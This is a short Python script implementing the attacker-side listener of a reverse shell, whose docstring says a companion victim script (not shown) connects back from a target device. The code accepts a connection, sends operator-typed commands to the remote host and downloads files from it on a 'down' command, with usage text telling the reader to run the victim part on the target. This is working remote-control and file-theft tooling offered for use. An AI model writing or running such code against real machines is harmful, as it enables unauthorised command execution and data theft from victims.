import socket

def ReverseAttacker():
    print("""
    ReverseAttacker => Listens for a connection, sends commands,
            and can download files from the connected host.
    reverseVictim => Connects back to the attacker, runs received
            commands, or sends file contents.
        useage:
            Run ReverseAttacker on your device to listen => then
            run ReverseVictim on the target device to connect back
            and exchange commands/files""")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("localhost", 8000))
    s.listen(5)
    print("[+] listening ....")
    conn, addr = s.accept()
    print("[*] Connected from: ", addr)
    while True:
        data = input("$: ")
        if "down" in data:
            D = data.split("down ")[1]
            conn.send(D.encode())
            data = conn.recv(4096)
            if "not" in data.decode():
                print("[-] Not found file")
            else:
                with open(D, "wb") as f:
                    f.write(data)
                    print(f"[*] {D} file is Saved")
        else:
            conn.send(data.encode())
            data = conn.recv(4096)
            print(data.decode())


